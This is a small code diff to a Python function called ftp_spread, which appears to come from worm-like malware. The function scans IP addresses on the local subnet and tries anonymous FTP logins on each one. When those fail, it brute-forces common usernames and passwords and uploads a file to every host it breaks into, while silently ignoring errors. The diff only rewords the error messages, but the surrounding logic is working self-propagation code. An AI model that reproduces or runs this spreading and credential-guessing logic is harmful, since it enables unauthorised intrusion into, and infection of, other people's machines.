@@ -231,7 +231,7 @@ def ftp_spread(common_users, common_pass):
             ip = f'{local_ip}.{i}'
             print(f"Trying for ip: {ip} as anonymous user")
             if not ftp_connect(ip, "", "", anonymous=True):
-                print("ERROR NOT SEND AS ANONYMOUS. TRYING COMMON CREDENTIALS...")
+                print("ERROR COULD NOT SEND AS ANONYMOUS. TRYING COMMON CREDENTIALS...")
                 done = False
                 for user in common_users:
                     if done: break
@@ -241,7 +241,7 @@ def ftp_spread(common_users, common_pass):
                         if done: 
                             print(f"DONE Sending file for user: {user}, ip: {ip}")
                             break 
-                        else: print("ERROR NOT SEND") 
+                        else: print(f"ERROR COULD NOT SEND WITH CREDENTIALS FOR IP: {ip}. (user: {user}, pwd: {pwd})") 
     except:
         pass
 
